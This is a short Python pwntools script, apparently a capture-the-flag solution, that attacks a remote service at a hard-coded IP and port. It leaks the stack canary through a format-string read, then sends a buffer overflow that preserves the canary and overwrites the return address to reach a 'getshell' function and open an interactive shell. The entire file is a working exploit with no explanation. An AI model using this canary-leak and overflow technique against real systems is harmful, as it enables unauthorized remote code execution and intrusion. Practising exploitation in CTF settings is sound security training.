from pwn import *

context.gdb_binary = "/usr/local/bin/pwndbg"

getshell_addr = 0x080491C9

#p = process("./attachment-5")
p = connect("39.96.193.120", 10004)
p.recvuntil("Hello Hacker!")
p.sendline(b'%31$p')
p.recvuntil(b"0x")
can = p.recvline()
print(can)
canary = int(can, 16)

payload = b'A' * 100
payload += p32(canary)
payload += b'A' * 0xc
payload += p32(getshell_addr)
#gdb.attach(p)
p.sendline(payload)

p.interactive()
